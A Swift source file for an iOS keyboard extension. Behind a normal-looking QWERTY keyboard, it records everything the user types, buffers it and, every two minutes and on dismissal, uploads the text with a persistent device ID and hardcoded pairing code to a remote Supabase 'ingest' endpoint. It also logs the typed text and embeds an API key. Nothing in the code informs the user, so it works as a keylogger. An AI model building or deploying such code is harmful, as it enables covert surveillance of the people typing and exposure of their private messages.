import UIKit
import Foundation

final class KeyboardViewController: UIInputViewController {

    // MARK: - Supabase ingest (Edge Function)
    private let ingestURL = "https://upkozoxjukgofgkidbyq.supabase.co/functions/v1/ingest"

    // Paste your Supabase Project Settings -> API -> anon public key here (JWT starting with "eyJ")
    private let supabaseAnonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVwa296b3hqdWtnb2Zna2lkYnlxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEwOTk4NzMsImV4cCI6MjA4NjY3NTg3M30.xmzK9_5SIp8xoRDCxeOnqSS7bWNJus3Ofp2C0GynQoY"

    // MARK: - Pairing / identity (MVP)
    private let pairCode = "DEMO123" // hardcode for MVP pairing
    private let deviceIDKey = "keyboard_device_id_v1"

    private func getDeviceID() -> String {
        if let id = UserDefaults.standard.string(forKey: deviceIDKey) { return id }
        let id = UUID().uuidString
        UserDefaults.standard.set(id, forKey: deviceIDKey)
        UserDefaults.standard.synchronize()
        return id
    }

    // MARK: - Text buffering / periodic send
    private var buffer: String = ""
    private let maxBufferChars = 2000

    /// How often we attempt to send (2 minutes)
    private let sendInterval: TimeInterval = 120.0
    /// How long after last keystroke before we consider user "done typing"
    private let typingCooldown: TimeInterval = 3.0

    private var periodicTimer: Timer?
    private var lastKeystrokeAt: Date = .distantPast
    /// Set to true when the 2-min mark passes but user is still typing
    private var pendingSend: Bool = false
    /// Timer that watches for typing to stop after a pending send
    private var cooldownTimer: Timer?

    // MARK: - Keyboard state
    private enum Mode { case letters, numbers, symbols }
    private var mode: Mode = .letters

    private var shiftOn: Bool = false
    private var capsLockOn: Bool = false
    private var lastShiftTapAt: Date?

    // MARK: - UI refs
    private var keyButtons: [UIButton] = []
    private var shiftButton: UIButton?

    // MARK: - Hold-to-delete
    private var deleteHoldTimer: Timer?
    private var deleteRepeatTimer: Timer?
    private let deleteInitialDelay: TimeInterval = 0.35
    private let deleteRepeatInterval: TimeInterval = 0.06

    // MARK: - Networking
    private lazy var session: URLSession = {
        let config = URLSessionConfiguration.ephemeral
        config.timeoutIntervalForRequest = 6
        config.timeoutIntervalForResource = 8
        config.waitsForConnectivity = false
        return URLSession(configuration: config)
    }()

    // MARK: - Lifecycle
    override func viewDidLoad() {
        super.viewDidLoad()
        setupUI()
        refreshKeyTitles()
        refreshShiftAppearance()
    }

    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        NSLog("KEYBOARD EXTENSION ACTIVE")
        NSLog("Full Access: %@", hasFullAccess ? "YES" : "NO")
    }

    override func viewWillDisappear(_ animated: Bool) {
        super.viewWillDisappear(animated)
        // Flush anything remaining before the keyboard goes away
        commitIfMeaningfulAndReset()
        periodicTimer?.invalidate()
        periodicTimer = nil
        cooldownTimer?.invalidate()
        cooldownTimer = nil
        deleteHoldTimer?.invalidate()
        deleteHoldTimer = nil
        deleteRepeatTimer?.invalidate()
        deleteRepeatTimer = nil
    }

    // MARK: - Periodic send timer

    /// Starts the 2-min timer if not already running
    private func ensurePeriodicTimer() {
        guard periodicTimer == nil else { return }
        periodicTimer = Timer.scheduledTimer(withTimeInterval: sendInterval, repeats: true) { [weak self] _ in
            self?.handlePeriodicTick()
        }
        if let t = periodicTimer {
            RunLoop.main.add(t, forMode: .common)
        }
    }

    private func stopPeriodicTimer() {
        periodicTimer?.invalidate()
        periodicTimer = nil
    }

    /// Called every 2 minutes. If user is typing, defer. Otherwise send.
    private func handlePeriodicTick() {
        let timeSinceLastKey = Date().timeIntervalSince(lastKeystrokeAt)

        if timeSinceLastKey >= typingCooldown {
            // User is idle — send now
            pendingSend = false
            commitIfMeaningfulAndReset()
        } else {
            // User is still typing — mark as pending and start watching
            pendingSend = true
            startCooldownWatch()
        }
    }

    /// Polls briefly to catch when the user stops typing after a pending send
    private func startCooldownWatch() {
        cooldownTimer?.invalidate()
        cooldownTimer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] timer in
            guard let self else { timer.invalidate(); return }

            let timeSinceLastKey = Date().timeIntervalSince(self.lastKeystrokeAt)
            if timeSinceLastKey >= self.typingCooldown {
                timer.invalidate()
                self.cooldownTimer = nil
                if self.pendingSend {
                    self.pendingSend = false
                    self.commitIfMeaningfulAndReset()
                }
            }
        }
        if let t = cooldownTimer {
            RunLoop.main.add(t, forMode: .common)
        }
    }

    // MARK: - Layout definitions
    private var letterRows: [[String]] {
        [
            Array("qwertyuiop").map(String.init),
            Array("asdfghjkl").map(String.init),
            ["⇧"] + Array("zxcvbnm").map(String.init) + ["⌫"],
            ["123", "space", "return"]
        ]
    }

    private var numberRows: [[String]] {
        [
            ["1","2","3","4","5","6","7","8","9","0"],
            ["-","/",":",";","(",")","$","&","@","\""],
            ["#+=",".",",","?","!","'","⌫"],
            ["ABC","space","return"]
        ]
    }

    private var symbolRows: [[String]] {
        [
            ["[","]","{","}","#","%","^","*","+","="],
            ["_","\\","|","~","<",">","€","£","¥","•"],
            ["123",".",",","?","!","'","⌫"],
            ["ABC","space","return"]
        ]
    }

    private func activeRows() -> [[String]] {
        switch mode {
        case .letters: return letterRows
        case .numbers: return numberRows
        case .symbols: return symbolRows
        }
    }

    // MARK: - UI setup
    private func setupUI() {
        view.subviews.forEach { $0.removeFromSuperview() }
        keyButtons.removeAll()
        shiftButton = nil

        let keyboard = UIStackView()
        keyboard.axis = .vertical
        keyboard.spacing = 8
        keyboard.translatesAutoresizingMaskIntoConstraints = false

        for rowKeys in activeRows() {
            keyboard.addArrangedSubview(makeRow(rowKeys))
        }

        view.addSubview(keyboard)

        NSLayoutConstraint.activate([
            keyboard.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor, constant: 8),
            keyboard.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor, constant: -8),
            keyboard.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 8),
            keyboard.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -8)
        ])

        keyboard.setContentCompressionResistancePriority(.required, for: .vertical)
        keyboard.setContentHuggingPriority(.required, for: .vertical)
    }

    private func makeRow(_ titles: [String]) -> UIStackView {
        let buttons = titles.map { title -> UIButton in
            let b = makeKey(title)
            wireButton(b, title: title)
            keyButtons.append(b)

            if title == "⇧" { shiftButton = b }

            b.titleLabel?.adjustsFontSizeToFitWidth = true
            b.titleLabel?.minimumScaleFactor = 0.7

            b.setContentCompressionResistancePriority(.defaultLow, for: .horizontal)
            b.setContentHuggingPriority(.defaultLow, for: .horizontal)

            // key height
            b.heightAnchor.constraint(equalToConstant: 48).isActive = true
            return b
        }

        let row = UIStackView(arrangedSubviews: buttons)
        row.axis = .horizontal
        row.spacing = (titles.count >= 10) ? 4 : 8
        row.distribution = .fillEqually
        row.translatesAutoresizingMaskIntoConstraints = false

        for b in buttons {
            guard let t = b.currentTitle else { continue }
            switch t {
            case "space":
                let c = b.widthAnchor.constraint(equalTo: row.widthAnchor, multiplier: 0.55)
                c.priority = .defaultHigh
                c.isActive = true
            case "return":
                let c = b.widthAnchor.constraint(equalTo: row.widthAnchor, multiplier: 0.25)
                c.priority = .defaultHigh
                c.isActive = true
            case "⌫", "⇧":
                let c = b.widthAnchor.constraint(equalTo: row.widthAnchor, multiplier: 0.14)
                c.priority = .defaultHigh
                c.isActive = true
            case "123", "ABC", "#+=":
                let c = b.widthAnchor.constraint(equalTo: row.widthAnchor, multiplier: 0.18)
                c.priority = .defaultHigh
                c.isActive = true
            default:
                break
            }
        }

        return row
    }

    private func makeKey(_ title: String) -> UIButton {
        let eart = UIColor(red: 0.42, green: 0.50, blue: 0.32, alpha: 1.0)
        let b = UIButton(type: .system)
        b.setTitle(title, for: .normal)
        b.titleLabel?.font = .systemFont(ofSize: 18)
        b.backgroundColor = .secondarySystemBackground
        b.layer.cornerRadius = 10
        b.tintColor = eart
        b.setTitleColor(eart, for: .normal)
        b.setTitleColor(eart.withAlphaComponent(0.45), for: .highlighted)
        b.setTitleColor(eart.withAlphaComponent(0.35), for: .disabled)
        return b
    }

    private func wireButton(_ b: UIButton, title: String) {
        if title == "⌫" {
            b.addTarget(self, action: #selector(deleteTouchDown), for: .touchDown)
            b.addTarget(self, action: #selector(deleteTouchUp),
                        for: [.touchUpInside, .touchUpOutside, .touchCancel, .touchDragExit])
            return
        }

        b.addAction(UIAction { [weak self] _ in
            self?.handleKey(title)
        }, for: .touchUpInside)
    }

    private func rebuildUIAndRefresh() {
        setupUI()
        refreshKeyTitles()
        refreshShiftAppearance()
    }

    // MARK: - Key handling
    private func handleKey(_ title: String) {
        switch title {
        case "space":
            press(" ")
        case "return":
            press("\n")
        case "⌫":
            backspaceOnce()
        case "⇧":
            handleShiftTap()

        case "123":
            mode = .numbers
            capsLockOn = false
            shiftOn = false
            rebuildUIAndRefresh()

        case "#+=":
            mode = .symbols
            capsLockOn = false
            shiftOn = false
            rebuildUIAndRefresh()

        case "ABC":
            mode = .letters
            rebuildUIAndRefresh()

        default:
            insertTextForKey(title)
        }
    }

    private func insertTextForKey(_ title: String) {
        if mode == .letters,
           title.count == 1,
           title.unicodeScalars.allSatisfy({ CharacterSet.letters.contains($0) }) {

            let out = (capsLockOn || shiftOn) ? title.uppercased() : title.lowercased()
            press(out)

            if shiftOn && !capsLockOn {
                shiftOn = false
                refreshKeyTitles()
                refreshShiftAppearance()
            }
        } else {
            press(title)
        }
    }

    // MARK: - Shift / Caps Lock
    private func handleShiftTap() {
        let now = Date()
        if let last = lastShiftTapAt, now.timeIntervalSince(last) < 0.35 {
            capsLockOn.toggle()
            shiftOn = capsLockOn
        } else {
            if capsLockOn {
                capsLockOn = false
                shiftOn = false
            } else {
                shiftOn.toggle()
            }
        }
        lastShiftTapAt = now
        refreshKeyTitles()
        refreshShiftAppearance()
    }

    private func refreshKeyTitles() {
        guard mode == .letters else { return }

        for b in keyButtons {
            guard let t = b.currentTitle, t.count == 1 else { continue }
            let isLetter = t.unicodeScalars.allSatisfy { CharacterSet.letters.contains($0) }
            guard isLetter else { continue }

            let newTitle = (capsLockOn || shiftOn) ? t.uppercased() : t.lowercased()
            b.setTitle(newTitle, for: .normal)
        }
    }

    private func refreshShiftAppearance() {
        guard let sb = shiftButton else { return }
        sb.backgroundColor = (capsLockOn || shiftOn) ? .tertiarySystemFill : .secondarySystemBackground
    }

    // MARK: - Delete (tap + hold)
    private func backspaceOnce() {
        textDocumentProxy.deleteBackward()
        if !buffer.isEmpty { buffer.removeLast() }
    }

    @objc private func deleteTouchDown() {
        backspaceOnce()

        deleteHoldTimer?.invalidate()
        deleteRepeatTimer?.invalidate()

        deleteHoldTimer = Timer.scheduledTimer(withTimeInterval: deleteInitialDelay, repeats: false) { [weak self] _ in
            guard let self else { return }
            self.deleteRepeatTimer?.invalidate()
            self.deleteRepeatTimer = Timer.scheduledTimer(withTimeInterval: self.deleteRepeatInterval, repeats: true) { [weak self] _ in
                self?.backspaceOnce()
            }
            if let t = self.deleteRepeatTimer {
                RunLoop.main.add(t, forMode: .common)
            }
        }

        if let t = deleteHoldTimer {
            RunLoop.main.add(t, forMode: .common)
        }
    }

    @objc private func deleteTouchUp() {
        deleteHoldTimer?.invalidate()
        deleteHoldTimer = nil
        deleteRepeatTimer?.invalidate()
        deleteRepeatTimer = nil
    }

    // MARK: - Buffering pipeline
    private func press(_ s: String) {
        textDocumentProxy.insertText(s)
        appendToBuffer(s)
        lastKeystrokeAt = Date()
        ensurePeriodicTimer()
    }

    private func appendToBuffer(_ s: String) {
        buffer += s
        if buffer.count > maxBufferChars {
            buffer = String(buffer.suffix(maxBufferChars))
        }
    }

    private func commitIfMeaningfulAndReset() {
        let text = buffer.trimmingCharacters(in: .whitespacesAndNewlines)
        guard text.count >= 3 else { return }

        buffer = ""
        stopPeriodicTimer()
        uploadToSupabase(text)
    }

    // MARK: - Supabase upload
    private func uploadToSupabase(_ text: String) {
        guard hasFullAccess else {
            NSLog("No Full Access; cannot upload")
            return
        }

        guard let url = URL(string: ingestURL) else {
            NSLog("Bad ingestURL: %@", ingestURL)
            return
        }

        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.setValue("Bearer \(supabaseAnonKey)", forHTTPHeaderField: "Authorization")
        req.setValue(supabaseAnonKey, forHTTPHeaderField: "apikey")

        let payload: [String: Any] = [
            "pair_code": pairCode,
            "device_id": getDeviceID(),
            "text": text,
            "ts": Int(Date().timeIntervalSince1970)
        ]

        do {
            let data = try JSONSerialization.data(withJSONObject: payload)
            req.httpBody = data
            if let s = String(data: data, encoding: .utf8) {
                NSLog("INGEST SEND: %@", s)
            }
        } catch {
            NSLog("JSON encode failed: %@", error.localizedDescription)
            return
        }

        session.dataTask(with: req) { data, resp, err in
            if let err = err {
                NSLog("INGEST error: %@", err.localizedDescription)
                return
            }

            let code = (resp as? HTTPURLResponse)?.statusCode ?? -1
            NSLog("INGEST status: %d", code)

            if let data = data,
               let body = String(data: data, encoding: .utf8),
               !body.isEmpty {
                NSLog("INGEST resp: %@", body)
            }
        }.resume()
    }
}
